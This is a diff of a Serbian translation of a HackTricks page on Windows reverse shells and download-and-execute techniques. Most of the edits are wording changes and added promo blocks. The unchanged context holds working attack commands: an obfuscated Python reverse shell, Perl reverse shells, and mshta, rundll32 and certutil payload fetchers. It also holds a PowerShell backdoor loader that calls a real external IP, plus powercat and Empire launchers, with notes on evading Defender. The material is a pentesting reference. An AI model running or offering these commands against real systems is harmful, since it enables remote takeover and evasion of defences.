@@ -8,16 +8,24 @@ Drugi načini podrške HackTricks-u:
 
 * Ako želite da vidite **vašu kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
-* Otkrijte [**Porodicu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
+* Otkrijte [**Porodičnu PEASS**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
 * **Podelite svoje hakovanje trikove slanjem PR-ova na** [**HackTricks**](https://github.com/carlospolop/hacktricks) i [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repozitorijume.
 
 </details>
 
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
+***
+
 ## Lolbas
 
 Stranica [lolbas-project.github.io](https://lolbas-project.github.io/) je za Windows kao što je [https://gtfobins.github.io/](https://gtfobins.github.io/) za linux.\
-Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni da izvrše neke vrste neočekivanih akcija poput **izvršavanja proizvoljnog koda.**
+Očigledno, **nema SUID fajlova ili sudo privilegija u Windows-u**, ali je korisno znati **kako** neki **binarni fajlovi** mogu biti (zlo)upotrebljeni da izvrše neke vrste neočekivanih akcija kao što je **izvršavanje proizvoljnog koda.**
 
 ## NC
 ```bash
@@ -43,8 +51,6 @@ uid=0(root) gid=0(root) groups=0(root)
 C:\Python27\python.exe -c "(lambda __y, __g, __contextlib: [[[[[[[(s.connect(('10.11.0.37', 4444)), [[[(s2p_thread.start(), [[(p2s_thread.start(), (lambda __out: (lambda __ctx: [__ctx.__enter__(), __ctx.__exit__(None, None, None), __out[0](lambda: None)][2])(__contextlib.nested(type('except', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: __exctype is not None and (issubclass(__exctype, KeyboardInterrupt) and [True for __out[0] in [((s.close(), lambda after: after())[1])]][0])})(), type('try', (), {'__enter__': lambda self: None, '__exit__': lambda __self, __exctype, __value, __traceback: [False for __out[0] in [((p.wait(), (lambda __after: __after()))[1])]][0]})())))([None]))[1] for p2s_thread.daemon in [(True)]][0] for __g['p2s_thread'] in [(threading.Thread(target=p2s, args=[s, p]))]][0])[1] for s2p_thread.daemon in [(True)]][0] for __g['s2p_thread'] in [(threading.Thread(target=s2p, args=[s, p]))]][0] for __g['p'] in [(subprocess.Popen(['\\windows\\system32\\cmd.exe'], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE))]][0])[1] for __g['s'] in [(socket.socket(socket.AF_INET, socket.SOCK_STREAM))]][0] for __g['p2s'], p2s.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: (__l['s'].send(__l['p'].stdout.read(1)), __this())[1] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 'p2s')]][0] for __g['s2p'], s2p.__name__ in [(lambda s, p: (lambda __l: [(lambda __after: __y(lambda __this: lambda: [(lambda __after: (__l['p'].stdin.write(__l['data']), __after())[1] if (len(__l['data']) > 0) else __after())(lambda: __this()) for __l['data'] in [(__l['s'].recv(1024))]][0] if True else __after())())(lambda: None) for __l['s'], __l['p'] in [(s, p)]][0])({}), 's2p')]][0] for __g['os'] in [(__import__('os', __g, __g))]][0] for __g['socket'] in [(__import__('socket', __g, __g))]][0] for __g['subprocess'] in [(__import__('subprocess', __g, __g))]][0] for __g['threading'] in [(__import__('threading', __g, __g))]][0])((lambda f: (lambda x: x(x))(lambda y: f(lambda: y(y)()))), globals(), __import__('contextlib'))"
 ```
 ## Perl
-
-Perl je moćan jezik skriptiranja koji se često koristi za pisanje shell skripti. Perl skripte se mogu izvršavati na Windows operativnom sistemu koristeći Perl interpreter.
 ```bash
 perl -e 'use Socket;$i="ATTACKING-IP";$p=80;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
 perl -MIO -e '$c=new IO::Socket::INET(PeerAddr,"ATTACKING-IP:80");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
@@ -107,7 +113,7 @@ mshta http://webserver/payload.hta
 ```bash
 mshta \\webdavserver\folder\payload.hta
 ```
-#### **Primer reverznog šela hta-psh (koristi hta da preuzme i izvrši PS backdoor)**
+#### **Primer hta-psh reverzne ljuske (koristi hta za preuzimanje i izvršavanje PS zadnjih vrata)**
 ```xml
 <scRipt language="VBscRipT">CreateObject("WscrIpt.SheLL").Run "powershell -ep bypass -w hidden IEX (New-ObjEct System.Net.Webclient).DownloadString('http://119.91.129.12:8080/1.ps1')"</scRipt>
 ```
@@ -166,7 +172,7 @@ Victim> mshta.exe //192.168.1.109:8080/5EEiDSd70ET0k.hta #The file name is given
 
 ## **Rundll32**
 
-[**Dll hello world primer**](https://github.com/carterjones/hello-world-dll)
+[**Dll primer pozdrav svetu**](https://github.com/carterjones/hello-world-dll)
 
 * [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ```bash
@@ -176,7 +182,7 @@ rundll32 \\webdavserver\folder\payload.dll,entrypoint
 ```bash
 rundll32.exe javascript:"\..\mshtml,RunHTMLApplication";o=GetObject("script:http://webserver/payload.sct");window.close();
 ```
-**Otkriveno od strane zaštitnika**
+**Otkriveno od strane defendera**
 
 **Rundll32 - sct**
 
@@ -256,7 +262,7 @@ run
 
 * [Odavde](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 
-Preuzmite B64dll, dekodirajte ga i izvršite.
+Preuzmite B64dll, dekodirajte je i izvršite.
 ```bash
 certutil -urlcache -split -f http://webserver/payload.b64 payload.b64 & certutil -decode payload.b64 payload.dll & C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil /logfile= /LogToConsole=false /u payload.dll
 ```
@@ -381,7 +387,7 @@ U **Shells** fascikli, postoji mnogo različitih shell-ova. Da biste preuzeli i 
 ```
 Invoke-PowerShellTcp -Reverse -IPAddress 10.2.0.5 -Port 4444
 ```
-Započnite posluživanje skripte na web serveru i izvršite je na kraju žrtve:
+Započnite posluživanje skripte na veb serveru i izvršite je na strani žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.11.0.134/shell2.ps1')|iex"
 ```
@@ -393,7 +399,7 @@ Defender ne otkriva to kao zlonamerni kod (još uvek, 3/04/2019).
 
 [**https://github.com/besimorhino/powercat**](https://github.com/besimorhino/powercat)
 
-Preuzmi, pokreni web server, pokreni osluškivač i izvrši na kraju žrtve:
+Preuzmi, pokreni web server, pokreni osluškivač i izvrši ga na strani žrtve:
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/powercat.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -401,7 +407,7 @@ Defender još uvek ne detektuje kao zlonamerni kod (3/04/2019).
 
 **Druge opcije koje nudi powercat:**
 
-Bind shell, Reverse shell (TCP, UDP, DNS), Preusmeravanje porta, otpremanje/preuzimanje, Generisanje payload-a, Slanje fajlova...
+Bind shell, Reverse shell (TCP, UDP, DNS), Preusmeravanje porta, upload/download, Generisanje payload-a, Slanje fajlova...
 ```
 Serve a cmd Shell:
 powercat -l -p 443 -e cmd
@@ -422,7 +428,7 @@ powercat -l -p 443 -i C:\inputfile -rep
 
 [https://github.com/EmpireProject/Empire](https://github.com/EmpireProject/Empire)
 
-Napravite powershell pokretač, sačuvajte ga u datoteku, preuzmite i izvršite.
+Napravite powershell pokretač, sačuvajte ga u datoteku i preuzmite i izvršite.
 ```
 powershell -exec bypass -c "iwr('http://10.2.0.5/launcher.ps1')|iex;powercat -c 10.2.0.5 -p 4444 -e cmd"
 ```
@@ -462,13 +468,19 @@ WinPWN](https://github.com/SecureThisShit/WinPwn) PS konzola sa nekim ofanzivnim
 * [https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Reverse%20Shell%20Cheatsheet.md)
 * [https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/](https://arno0x0x.wordpress.com/2017/11/20/windows-oneliners-to-download-remote-payload-and-execute-arbitrary-code/)
 ​
+**Try Hard Security Group**
+
+<figure><img src="../.gitbook/assets/telegram-cloud-document-1-5159108904864449420.jpg" alt=""><figcaption></figcaption></figure>
+
+{% embed url="https://discord.gg/tryhardsecurity" %}
+
 <details>
 
 <summary><strong>Naučite hakovanje AWS-a od nule do heroja sa</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>
 
 Drugi načini podrške HackTricks-u:
 
-* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** Proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
+* Ako želite da vidite svoju **kompaniju reklamiranu na HackTricks-u** ili **preuzmete HackTricks u PDF formatu** proverite [**PLANOVE ZA PRIJAVU**](https://github.com/sponsors/carlospolop)!
 * Nabavite [**zvanični PEASS & HackTricks swag**](https://peass.creator-spring.com)
 * Otkrijte [**The PEASS Family**](https://opensea.io/collection/the-peass-family), našu kolekciju ekskluzivnih [**NFT-ova**](https://opensea.io/collection/the-peass-family)
 * **Pridružite se** 💬 [**Discord grupi**](https://discord.gg/hRep4RUj7f) ili [**telegram grupi**](https://t.me/peass) ili nas **pratite** na **Twitteru** 🐦 [**@hacktricks_live**](https://twitter.com/hacktricks_live)**.**
